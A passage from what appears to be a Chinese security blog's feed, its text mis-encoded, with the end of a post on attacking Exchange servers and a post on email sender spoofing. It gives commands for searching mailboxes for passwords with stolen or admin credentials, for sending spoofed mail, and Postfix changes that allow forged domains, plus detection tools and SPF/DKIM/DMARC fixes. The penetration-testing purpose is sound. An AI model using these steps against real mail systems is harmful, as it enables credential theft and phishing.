ä»¥åï¼Œæˆ‘ä»¬å¯ä»¥å¯¹å…¶é‚®ä»¶å†…å®¹è¿›è¡Œæœç´¢ï¼Œé™¤äº†ç›´æ¥ç™»å½•é‚®ä»¶å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨Exchangeçš„æ¥å£è¿›è¡Œé‚®ä»¶çš„æ£€ç´¢ï¼Œå…¶æ¥å£çš„ç›¸å…³å¼€å‘å¯ä»¥å‚è€ƒã€Š<a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS" target="_blank" rel="noopener">Exchange Web Service(EWS)å¼€å‘æŒ‡å—</a>%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/)ã€‹ï¼Œåœ¨å¤–ç½‘æƒ…å†µä¸‹ï¼Œå¯ä½¿ç”¨æ­¤å·¥å…·æ¥åˆ—å‡ºé‚®ä»¶å†…å®¹ã€‚<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewshost/ews/Exchange.asmx -Mode ListMail -Folder Inbox</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010921519.jpg" alt="-w959"></p><p>æœç´¢æŸå­—ç¬¦ä¸²ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ewsManage.exe -CerValidation No -ExchangeVersion Exchange2013_SP1 -u username -p password -ewsPath https://ewhost/ews/Exchange.asmx -Mode SearchMail -String vpn</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010976996.jpg" alt="-w1439"></p><p>æˆ–è€…ä½¿ç”¨MailSniperçš„Invoke-SelfSearchæ·»åŠ <code>-remote</code> å‚æ•°ï¼Œè¾“å…¥è´¦å·å¯†ç å³å¯ã€‚ä½¿ç”¨æ¥å£å¯ä»¥<code>bypassä¸€äº›owaçš„2FA</code>ã€‚</p><p>å†…ç½‘æƒ…å†µä¸‹å¯ä½¿ç”¨MailSniperæ¥å¿«é€Ÿæ£€ç´¢ï¼Œå¦‚ä½¿ç”¨xiaoming\domainç”¨æˆ·ç™»å½•æŸä¸»æœºï¼Œå¯åœ¨è¯¥ä¸»æœºä¸Šæœç´¢xiaomingçš„é‚®ç®±ï¼ˆä¸éœ€è¦å¯†ç ï¼‰<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SelfSearch -Mailbox user@domain.com -Terms *pass* -Folder all -ExchangeVersion Exchange2013_SP1 -OutputCsv <span class="number">1</span>.csv</span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993350.jpg" alt="-w841"></p><p>å¦‚æœè·å¾—äº†åŸŸç®¡ç†å‘˜çš„å¯†ç ï¼Œå¯ä»¥æ£€ç´¢ä»»æ„é‚®ä»¶çš„å†…å®¹ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-GlobalMailSearch -ImpersonationAccount beiguoxia -ExchHostname Exchangehostname -AdminUserName domain\administrator  -AdminPassword password -Term <span class="string">"*pass*"</span> -Folder all</span><br></pre></td></tr></table></figure><p><img src="https://evi1cg.github.io/usr/uploads/2019/01/2965525239.jpg" alt="1547034512542.jpg"></p><blockquote><p>æ£€ç´¢å¯ä½¿ç”¨<code>-Term</code>æˆ–è€…æ­£åˆ™<code>-Regex</code>æ¥æŒ‡å®šå…³é”®å­—ï¼Œ<code>-ImpersonationAccount</code>ç”¨äºå°†å½“å‰ç”¨æˆ·èº«ä»½åˆæ³•ä¼ªè£…å…¶ä»–é‚®ç®±ç”¨æˆ·ï¼Œè¿›è€Œè·å¾—æŸ¥è¯¢æ‰€æœ‰é‚®ç®±ç”¨æˆ·é‚®ä»¶çš„æƒé™ï¼Œå¦‚æœæŸ¥è¯¢å¤±è´¥ï¼Œå¯ä»¥å°è¯•æ·»åŠ <code>-ExchangeVersion</code>æ›´æ¢Exchangeç‰ˆæœ¬,ç›®å‰æ”¯æŒç‰ˆæœ¬ä¸º<code>Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013,Exchange2013_SP1</code></p></blockquote><h2 id="0x05-åæ¸—é€"><a href="#0x05-åæ¸—é€" class="headerlink" title="0x05 åæ¸—é€"></a>0x05 åæ¸—é€</h2><p>åœ¨è·å–ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç ä¹‹åï¼Œå¦‚ä½•è¿›å…¥å†…ç½‘ï¼Ÿè¿™é‡Œæœ‰ä¸€ä¸ªç¥å™¨<strong><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a></strong>,åœ¨Outlookä¸­æœ‰ä¸€ä¸ªRules and Alertsçš„åŠŸèƒ½ï¼Œåˆ©ç”¨æ­¤åŠŸèƒ½ï¼Œå¯æ‰§è¡Œä¸€äº›ç‰¹å®šçš„å¦‚æ‰§è¡Œå‘½ä»¤ç­‰æ“ä½œï¼Œå…³äºrulerçš„å…·ä½“ä½¿ç”¨ï¼Œå¯ä»¥å‚è€ƒç›¸å…³æ–‡ç« ï¼Œå¦å¤–åœ¨å†…ç½‘ä¸­ï¼Œå¦‚ä½•å»å‘ç°ExchangeæœåŠ¡å™¨ï¼Œå¦‚ä½•ä½¿ç”¨NTLMä¸­ç»§æ¥æ¥ç®¡æŸç”¨æˆ·é‚®ç®±çš„æƒé™ï¼Œè¿™äº›å†…å®¹åœ¨<a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">ã€Šæ·±å…¥Exchange Serveråœ¨ç½‘ç»œæ¸—é€ä¸‹çš„åˆ©ç”¨æ–¹æ³•ã€‹</a>ä¸­æœ‰äº†å¾ˆè¯¦ç»†çš„è®²è§£ï¼Œåœ¨è¿™é‡Œå°±ä¸å¤šåšé˜è¿°ã€‚</p><p>å¦å¤–éœ€è¦è¡¥å……ä¸€ç‚¹å¯èƒ½æœ‰ç”¨çš„ä¸œè¥¿ï¼ŒExchangeå®‰è£…ä»¥åä¼šåˆ›å»ºä¸€ä¸ª<code>Organization Management</code> å®‰å…¨ç»„ï¼š</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010940263.jpg" alt="-w650"></p><p>è¯¥ç»„å†…çš„æˆå‘˜é™¤äº†è®¿é—®Exchagneè®¾ç½®å¤–ï¼Œå¯ä»¥ä¿®æ”¹å…¶ä»–Exchagneå®‰å…¨ç»„çš„æˆå‘˜èº«ä»½ï¼Œå¦‚<code>Exchange Trusted Subsystem</code>,æ­¤ç»„ä¸º<code>Exchange Windows Permissions</code>çš„æˆå‘˜</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993399.jpg" alt="-w477"></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>Exchange Windows Permissions</code>å®‰å…¨ç»„å¯¹å®‰è£…Exchangeçš„åŸŸçš„åŸŸå¯¹è±¡å…·æœ‰writeDACLæƒé™,è¿™å°±æ„å‘³ç€ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæƒé™çš„æå‡ï¼Œè¯¦ç»†çš„æ–‡ç« å¯ä»¥å‚è€ƒ<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">ã€ŠEscalating privileges with ACLs in Active Directoryã€‹</a>ã€‚</p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>æœ¬æ–‡è®°å½•äº†æˆ‘è‡ªå·±å¯¹Exchangeåœ¨æ¸—é€ä¸­çš„åˆ©ç”¨çš„ä¸€äº›æ–¹å¼çš„æ€»ç»“ï¼Œæ¬¢è¿è¡¥å……ï¼Œæ›´è¯¦ç»†çš„å†…å®¹å¯ä»¥æŸ¥çœ‹å‚è€ƒçš„æ–‡ç« ã€‚</p><h2 id="0x07-å‚è€ƒ"><a href="#0x07-å‚è€ƒ" class="headerlink" title="0x07 å‚è€ƒ"></a>0x07 å‚è€ƒ</h2><ol><li><a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0</a></li><li><a href="https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/</a></li><li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-Exchangeç®€ä»‹&quot;&gt;&lt;a href=&quot;#0x00-Exchangeç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;0x00 Exchangeç®€ä»‹&quot;&gt;&lt;/a&gt;0x00 Exchangeç®€ä»‹&lt;/h2&gt;&lt;p&gt;Windows Exchange S
      
    
    </summary>
    
      <category term="æŠ€æœ¯åˆ†äº«" scheme="https://evi1cg.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Something about email spoofing</title>
    <link href="https://evi1cg.github.io/archives/Email_spoofing.html"/>
    <id>https://evi1cg.github.io/archives/Email_spoofing.html</id>
    <published>2018-10-10T22:23:00.000Z</published>
    <updated>2020-01-17T01:58:32.427Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-è¿™æ˜¯ä¸ªå•¥ï¼Ÿ"><a href="#0x00-è¿™æ˜¯ä¸ªå•¥ï¼Ÿ" class="headerlink" title="0x00 è¿™æ˜¯ä¸ªå•¥ï¼Ÿ"></a>0x00 è¿™æ˜¯ä¸ªå•¥ï¼Ÿ</h2><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬æ”¶åˆ°ä¸€å°é‚®ä»¶ä¹‹åï¼Œéƒ½ä¼šé¦–å…ˆçœ‹å‘ä»¶äººï¼Œå¦‚æœæ˜¯æ¯”è¾ƒé‡è¦çš„é‚®ä»¶ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå»çœ‹å‘ä»¶äººåœ°å€ï¼Œä½†æ˜¯ï¼Œå¦‚æœå‘ä»¶äººæ˜¯ä¼ªé€ çš„ï¼Œä½ è¿˜èƒ½çŸ¥é“æ˜¯è°å†ç»™ä½ å‘é‚®ä»¶ä¹ˆï¼Ÿ<br>å½“æˆ‘ä»¬åœ¨è°·æ­Œæœç´¢å‘ä»¶äººä¼ªé€ çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šå¾ˆå¤šçš„ç½‘ç«™æä¾›äº†è¿™æ ·çš„åŠŸèƒ½ï¼š<br><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105094825.png" alt="è¯·è¾“å…¥å›¾ç‰‡æè¿°"></p><blockquote><p>è¿™äº›ç½‘ç«™æ²¡æœ‰æµ‹è¯•ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½æˆåŠŸä¼ªé€ ã€‚</p></blockquote><p>é‚£åˆ°åº•æ˜¯ä»€ä¹ˆå¯¼è‡´çš„å‘ä»¶äººä¼ªé€ å‘¢ï¼Ÿä¸‹é¢æˆ‘ä»¬æ¥åˆ†æåˆ†æé€ æˆå‘ä»¶äººä¼ªé€ çš„æˆå› ã€‚</p><h2 id="0x01-SMTPæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#0x01-SMTPæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="0x01 SMTPæ˜¯ä»€ä¹ˆï¼Ÿ"></a>0x01 SMTPæ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>è¦æƒ³äº†è§£æˆå› ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯SMTPï¼Œé¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹å‡ ä¸ªæ¦‚å¿µï¼š<br><strong>MUA</strong>:Mail User Agentã€‚ç”¨æˆ·é‚®ä»¶ä»£ç†,ç”¨æˆ·é€šè¿‡MUAæ¥æ”¶å‘é€é‚®ä»¶.ä¾‹å¦‚Outlook, FoxMailç­‰ã€‚<br><strong>MTA</strong>: Mail Transfer Protocolã€‚é‚®ä»¶ä¼ è¾“ä»£ç†,æ˜¯SMTPçš„ä¸€ç§å®ç°ï¼ŒMTAä»…ä»…è´Ÿè´£é‚®ä»¶çš„ä¼ è¾“ã€‚å¦‚æœä¿¡ä»¶çš„ç›®çš„åœ°å¹¶ä¸æ˜¯æœ¬èº«çš„ç”¨æˆ·ï¼Œä¸”è¯¥å°ä¿¡çš„ç›¸å…³æ•°æ®ç¬¦åˆä½¿ç”¨ MTA çš„æƒåŠ›ï¼Œ é‚£ä¹ˆMTA å°±ä¼šå°†è¯¥å°ä¿¡å†ä¼ é€åˆ°ä¸‹ä¸€éƒ¨ä¸»æœºä¸Šã€‚è¿™å³æ˜¯æ‰€è°“çš„è½¬é€’çš„åŠŸèƒ½ã€‚<br><strong>MDA</strong>: Mail Deliver Agentï¼Œé‚®ä»¶åˆ†å‘ä»£ç†ã€‚è´Ÿè´£å°†æ¥æ”¶åˆ°çš„é‚®ä»¶ä¿å­˜åœ¨é‚®ä»¶æœåŠ¡å™¨ä¸Šï¼Œåœ¨è¿™é‡Œå¯ä»¥è®¾ç½®å¯¹é‚®ä»¶è¿›è¡Œè¿‡æ»¤æˆ–è‡ªåŠ¨å›å¤ã€‚<br><strong>MRA</strong>: Mail Receive Agentï¼Œé‚®ä»¶æ¥æ”¶ä»£ç†,ç”¨æ¥å®ç°IMAP,POP3åè®®,è´Ÿè´£ä¸MUAäº¤äº’,å°†æœåŠ¡å™¨ä¸Šçš„é‚®ä»¶é€šè¿‡IMAPä»¥åŠPOP3ä¼ è¾“ç»™å®¢æˆ·ç«¯ã€‚</p><p>SMTPå…¨ç§°æ˜¯Simple Mail Transfer Protocol,ç›´è¯‘è¿‡æ¥å°±æ˜¯ç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼Œä¸»è¦çš„å·¥ä½œå°±æ˜¯æŠŠé‚®ä»¶ä¿¡æ¯ä»å‘ä»¶äººçš„é‚®ä»¶æœåŠ¡å™¨ä¸­ä¼ é€åˆ°æ¥æ”¶äººçš„é‚®ä»¶æœåŠ¡å™¨ä¸­ï¼Œå¶å°”æˆ‘ä»¬ä½¿ç”¨MUAæ¥å‘é€é‚®ä»¶çš„è¯,ä¹Ÿæ‰¿è½½ä¼ è¾“ç”¨æˆ·é‚®ä»¶åˆ°å‘ä»¶æœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œä½†æ˜¯SMTPå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯<code>æ²¡æœ‰å¯¹å‘é€æ–¹è¿›è¡Œä¸€ä¸ªèº«ä»½éªŒè¯</code>ã€‚ç”¨ä¸‹é¢çš„å›¾æ¥è¯´æ˜ä¸€ä¸‹é‚®ä»¶çš„æŠ•é€’è¿‡ç¨‹ã€‚</p><p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105094914.png" alt="è¯·è¾“å…¥é“¾æ¥æè¿°"></p><p>1ã€ç”¨æˆ·åˆ©ç”¨MUAå¯„ä¿¡åˆ°MTAï¼Œè¿™é‡Œé¢åŒ…å«äº†å‡ ä¸ªé¡¹ï¼š<br><strong>å‘ä¿¡äººä¸å‘ä¿¡ç½‘ç«™</strong>ï¼šä¾‹å¦‚ <a href="mailto:admin@evi1cg.me" target="_blank" rel="noopener">admin@evi1cg.me</a>ï¼Œå…¶ä¸­evi1cg.meå°±æ˜¯å‘ä¿¡ç½‘ç«™ï¼Œå³æ”¶ä¿¡ä»¶çš„MTAã€‚<br><strong>æ”¶ä¿¡äººä¸æ”¶ä¿¡ç½‘ç«™</strong>ï¼šä¾‹å¦‚ <a href="mailto:admin@email.server" target="_blank" rel="noopener">admin@email.server</a>ï¼Œå…¶ä¸­adminå°±æ˜¯email.serveré‡Œçš„ä¸€ä¸ªè´¦å·ã€‚<br>2ã€å½“MTAæ”¶åˆ°ä¿¡ä»¶åï¼Œä¼šé€šè¿‡DNSçš„MXè®°å½•è¿›è¡ŒæŸ¥è¯¢ï¼Œå¦‚æœemail.serveræ˜¯MTAè‡ªå·±ï¼Œæ­¤æ—¶MTAå°±ä¼šæŠŠé‚®ä»¶äº¤ç»™MDAå¤„ç†ï¼Œæ”¾ç½®åˆ°æ”¶ä¿¡è€…çš„ä¿¡ç®±ä¸­ã€‚<br>3ã€å¦‚æœemail.serverä¸æ˜¯è‡ªå·±ï¼Œé‚£ä¹ˆè¿™ä¸ªä¿¡ä»¶å°±ä¼šè¢«è½¬é€å‡ºå»ã€‚<br>4ã€å½“è¿œç¨‹MTAæ”¶åˆ°æœ¬åœ°MTAè½¬å‘çš„é‚®ä»¶åï¼Œä¼šå°†ä¿¡ä»¶äº¤ç»™å®ƒçš„MDAå¤„ç†ï¼Œç­‰å¾…ç”¨æˆ·çš„è¯»å–æˆ–ä¸‹è½½ã€‚</p><p>æ­£æ˜¯ç”±äºMTAä¹‹é—´è½¬å‘é‚®ä»¶æ˜¯ä¸éœ€è¦è®¤è¯çš„ï¼Œæ‰€ä»¥è¿™å°±æˆäº†å¯ä»¥ä¼ªé€ å‘ä»¶äººçš„åŸå› ã€‚</p><h2 id="0x02-æ€ä¹ˆæ­å»ºSMTP-Serverï¼Ÿ"><a href="#0x02-æ€ä¹ˆæ­å»ºSMTP-Serverï¼Ÿ" class="headerlink" title="0x02 æ€ä¹ˆæ­å»ºSMTP Serverï¼Ÿ"></a>0x02 æ€ä¹ˆæ­å»ºSMTP Serverï¼Ÿ</h2><p>å¦‚ä½•å¿«é€Ÿæ­å»ºè‡ªå·±çš„SMTP Serverï¼Ÿè¿™ä¸ªç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œè¿™é‡Œä¸ºäº†å¿«é€Ÿæ­å»ºï¼Œå¯ä»¥é€‰æ‹©ä½¿ç”¨ewomailï¼Œä»£ç æ˜¯<a href="https://github.com/gyxuehu/EwoMail" target="_blank" rel="noopener">å¼€æº</a>çš„,æ­å»ºèµ·æ¥ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œä¹Ÿæœ‰å¾ˆå¥½åœ°<a href="http://doc.ewomail.com/ewomail/285649" target="_blank" rel="noopener">è¯´æ˜æ–‡æ¡£</a>ï¼ŒEwoMailæ˜¯åŸºäºpostfixå’ŒDovecotï¼ŒæŒ‰ç…§è¯´æ˜æ–‡æ¡£å¾ˆå¿«å°±å¯ä»¥éƒ¨ç½²å®Œæ¯•äº†ï¼Œéƒ¨ç½²å®Œæ¯•ä»¥åéœ€è¦æ·»åŠ ç”¨æˆ·è´¦å·ï¼š<br><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105094950.png" alt="1539071369229.png"><br>ä¹‹åå°±å¯ä»¥é€šè¿‡æ·»åŠ çš„è´¦å·æ¥å‘é€é‚®ä»¶äº†ã€‚</p><h2 id="0x03-å¦‚ä½•ä¼ªé€ åŸŸåï¼Ÿ"><a href="#0x03-å¦‚ä½•ä¼ªé€ åŸŸåï¼Ÿ" class="headerlink" title="0x03 å¦‚ä½•ä¼ªé€ åŸŸåï¼Ÿ"></a>0x03 å¦‚ä½•ä¼ªé€ åŸŸåï¼Ÿ</h2><p>å…³äºä¼ªé€ åŸŸåæœ‰ä¸€ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·<a href="https://github.com/lunarca/SimpleEmailSpoofer" target="_blank" rel="noopener">SimpleEmailSpoofer</a>ï¼Œä¸‹é¢æˆ‘ä»¬å°±ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥æµ‹è¯•ä¸€ä¸‹ï¼š<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SimpleEmailSpoofer<span class="selector-class">.py</span> -t ç›®æ ‡é‚®ç®± -f è¦ä¼ªé€ çš„å‘ä»¶äººåœ°å€ -n From_name -e é‚®ä»¶å†…å®¹ -j é‚®ä»¶ä¸»é¢˜ -s ä½ è‡ªå·±çš„smtpåœ°å€ -<span class="selector-tag">p</span> <span class="number">25</span> --user ä½ æ·»åŠ çš„ç”¨æˆ· --pass ä½ æ·»åŠ ç”¨æˆ·çš„å¯†ç </span><br></pre></td></tr></table></figure></p><p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105095040.png" alt="1539071731274.png"></p><p>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æŠ¥é”™äº†ï¼Œ<code>Sender address rejected: not owned by user xxx</code>, è¿™é‡Œæ˜¯postfixè®¾ç½®çš„é—®é¢˜ã€‚éœ€è¦è¿›è¡Œä¸€ä¸‹ä¿®æ”¹<code>/etc/postfix/main.cf</code><br>æ‰¾åˆ°<code>smtpd_sender_login_maps</code>ï¼Œä¿®æ”¹ä¸ºï¼š<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtpd_sender_login_maps = <span class="string">mysql:</span><span class="regexp">/etc/</span>postfix<span class="regexp">/mysql/</span>mysql-sender-login-maps.cf,<span class="string">pcre:</span><span class="regexp">/etc/</span>postfix/login_maps.pcre</span><br></pre></td></tr></table></figure></p><p>æ–°å»º<code>/etc/postfix/login_maps.pcre</code><br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/^(.*)$/</span> test@yourdomain.com</span><br></pre></td></tr></table></figure></p><blockquote><p>æ„æ€æ˜¯å…è®¸ç”¨æˆ·<a href="mailto:test@yourdomain.com" target="_blank" rel="noopener">test@yourdomain.com</a>çš„ç”¨æˆ·ä½¿ç”¨ä»»æ„domain</p></blockquote><p>æ‰¾åˆ°<code>smtpd_recipient_restrictions</code>ï¼Œåˆ é™¤<code>reject_unknown_sender_domain</code>ï¼Œè¿™æ ·å°±ä¸ä¼šå¯¹å‘é€çš„åŸŸè¿›è¡ŒéªŒè¯äº†ã€‚</p><p>ä¿®æ”¹å®Œæˆä»¥åï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postmap <span class="string">/etc/postfix/login_maps.pcre</span></span><br><span class="line">postfix <span class="keyword">reload</span></span><br></pre></td></tr></table></figure></p><p>ä¿®æ”¹å®Œæˆä»¥åï¼Œå†æ¬¡å‘é€ï¼š</p><p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105095109.png" alt="1539072657218.png"></p><p>æŸ¥çœ‹gmail:<br><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105095139.png" alt="1539078304784.png"></p><p><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105095206.png" alt="1539072834239.png"></p><p>å½“ç„¶ï¼Œåœ¨åŸå§‹é‚®ä»¶é‡Œé¢ï¼Œè¿˜æ˜¯æœ‰è‡ªå·±çš„åŸŸåä¿¡æ¯ã€‚å¦‚ä½•å°½é‡å‡å°‘è‡ªå·±çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒè¿™ç¯‡<a href="https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/" target="_blank" rel="noopener">æ–‡ç« </a>ã€‚</p><blockquote><p>ç»è¿‡æµ‹è¯•ï¼Œå¦‚æœæ”¶ä¿¡æœåŠ¡å™¨å¯¹SPFæ ¡éªŒä¸é€šè¿‡çš„é‚®ä»¶æœªä½œå¤„ç†ï¼Œä»ç„¶å¯ä»¥ä¼ªé€ æ·»åŠ è¿‡SPFè®°å½•çš„åŸŸã€‚å¦‚QQé‚®ç®±æ£€æŸ¥SPFå¤±è´¥å°±ç›´æ¥æ‹’ç»æ¥æ”¶é‚®ä»¶ï¼Œä½†æ˜¯gmailä»ç„¶æ¥æ”¶ã€‚è¿™é‡Œè¦æ³¨æ„ä¸€ç‚¹ï¼ŒSPFä¸­å¦‚æœé…ç½®ä¸º<code>~all</code>ï¼Œåˆ™è¡¨ç¤ºä¸ºæ¥å—æ¥ä¿¡ï¼Œä½†æ˜¯åšæ ‡è®°ï¼ŒQQé‚®ç®±é‡Œå°±ä¼šæ¥æ”¶åˆ°æ­¤ç±»ä¼ªé€ çš„é‚®ä»¶ï¼Œä½†æ˜¯å›æ”¾ç½®äºåƒåœ¾é‚®ä»¶é‡Œã€‚</p></blockquote><h2 id="0x04-å¦‚ä½•æ£€æµ‹ï¼Ÿ"><a href="#0x04-å¦‚ä½•æ£€æµ‹ï¼Ÿ" class="headerlink" title="0x04 å¦‚ä½•æ£€æµ‹ï¼Ÿ"></a>0x04 å¦‚ä½•æ£€æµ‹ï¼Ÿ</h2><p>è¿™é‡Œæœ‰ä¸€ä¸ªå·¥å…·å¯ä»¥ç”¨æ¥æ£€æµ‹åŸŸåæ˜¯å¦å¯ä»¥è¢«ä¼ªé€ :<a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">spoofcheck</a>ï¼Œä½¿ç”¨å¾ˆç®€å•ï¼Œæ¯”å¦‚baidu:<br><img src="https://blogpics-1251691280.file.myqcloud.com/imgs/20191105095255.png" alt="1539074907929.png"></p><h2 id="0x05-å¦‚ä½•è§£å†³ï¼Ÿ"><a href="#0x05-å¦‚ä½•è§£å†³ï¼Ÿ" class="headerlink" title="0x05 å¦‚ä½•è§£å†³ï¼Ÿ"></a>0x05 å¦‚ä½•è§£å†³ï¼Ÿ</h2><p>ä¸ºäº†ä½¿å¾—åŸŸåä¸ä¼šè¢«ä¼ªé€ ï¼Œéœ€è¦ä¸ºåŸŸåæ­£ç¡®é…ç½®<code>SPF</code>ã€<code>DKIM</code>ã€<code>DMARC</code>ã€‚åªé…ç½®SPFæ˜¯ä¸è¡Œçš„ï¼Œå…³äºSPFçš„é…ç½®å¯ä»¥å‚è€ƒ<a href="http://blog.51cto.com/10602188/1882947" target="_blank" rel="noopener">è¿™é‡Œ</a>ï¼Œå…³äºDKIMçš„é…ç½®ï¼Œå¯ä»¥çœ‹<a href="https://www.zoho.com.cn/mail/help/adminconsole/dkim-configuration.html" target="_blank" rel="noopener">è¿™é‡Œ</a>ï¼Œå…³äºDMARCçš„é…ç½®å¯ä»¥å‚è€ƒ<a href="https://support.google.com/a/answer/2466563?hl=zh-Hans" target="_blank" rel="noopener">è¿™é‡Œ</a>ã€‚</p><h2 id="0x06-å‚è€ƒ"><a href="#0x06-å‚è€ƒ" class="headerlink" title="0x06 å‚è€ƒ"></a>0x06 å‚è€ƒ</h2><ol><li><a href="https://www.jianshu.com/p/610d9bf0ae8b" target="_blank" rel="noopener">https://www.jianshu.com/p/610d9bf0ae8b</a></li><li><a href="http://lomu.me/post/SPF-DKIM-DMARC-PTR" target="_blank" rel="noopener">http://lomu.me/post/SPF-DKIM-DMARC-PTR</a></li><li><a href="https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix" target="_blank" rel="noopener">https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix</a></li><li><a href="https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/" target="_blank" rel="noopener">https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/</a></li><li><a href="https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles" target="_blank" rel="noopener">https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-è¿™æ˜¯ä¸ªå•¥ï¼Ÿ&quot;&gt;&lt;a href=&quot;#0x00-è¿™æ˜¯ä¸ªå•¥ï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;0x00 è¿™æ˜¯ä¸ªå•¥ï¼Ÿ&quot;&gt;&lt;/a&gt;0x00 è¿™æ˜¯ä¸ªå•¥ï¼Ÿ&lt;/h2&gt;&lt;p&gt;ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬æ”¶åˆ°ä¸€å°é‚®ä»¶ä¹‹åï¼Œéƒ½ä¼šé¦–å…ˆçœ‹å‘ä»¶äººï¼Œå¦‚æœæ˜¯æ¯”è¾ƒé‡è¦çš„é‚®ä»¶ï¼Œæˆ‘ä»¬
      
